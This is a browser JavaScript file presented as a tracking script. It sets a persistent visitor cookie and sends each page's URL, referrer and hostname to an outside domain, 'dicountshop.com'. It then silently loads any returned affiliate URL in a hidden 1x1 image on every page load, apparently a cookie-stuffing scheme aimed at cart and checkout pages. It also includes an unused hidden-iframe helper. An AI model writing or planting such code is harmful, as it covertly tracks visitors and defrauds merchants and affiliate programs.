(function () {
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    function createTrackingPixel(url) {
      console.log("url. ==> ",url)
        var img = document.createElement('img');
        img.src = url;
        img.width = 1;
        img.height = 1;
        img.style.display = 'none';
        img.style.visibility = 'hidden';
        document.body.appendChild(img);
    }

    function createClickIframe(url) {
        var iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.width = "1";
        iframe.height = "1";
        iframe.style.display = "none";
        iframe.style.visibility = "hidden";
        document.body.appendChild(iframe);
    }

    async function initTracking() {
        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
            console.log("in 36 ", uniqueId)
            let response = await fetch('https://dicountshop.com/api/track-user', {
                method: 'POST',
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                }),
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            console.log("before result ==> ")
            
            let raw = await response.text();  
            console.log("Raw response from server => ", raw);

            let result;
            try {
                result = JSON.parse(raw);
            } catch (e) {
                console.error("Response is not valid JSON:", e);
                return;
            }

            console.log("Parsed JSON => ", result);

            console.log("after result ==> ", result)

           
            if (result.success && result.affiliate_url) {
                
                createTrackingPixel(result.affiliate_url);
               
                sessionStorage.setItem('iframe_triggered', 'true');
            } else {
                createTrackingPixel('https://dicountshop.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Error in tracking script:', error);
        }
    }

    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return '';
    }

    function isCartPage() {
            console.log("Add to card result ==> ")
        const cartPages = ["/cart", "/checkout","/checkout/shipping","/checkout/cart"];
        return cartPages.some(path => window.location.pathname.includes(path));
    }

    if (isCartPage()) {
        initTracking();
    }
    initTracking();
    setTimeout(initTracking, 2000);
    window.addEventListener("DOMContentLoaded", initTracking);
})();
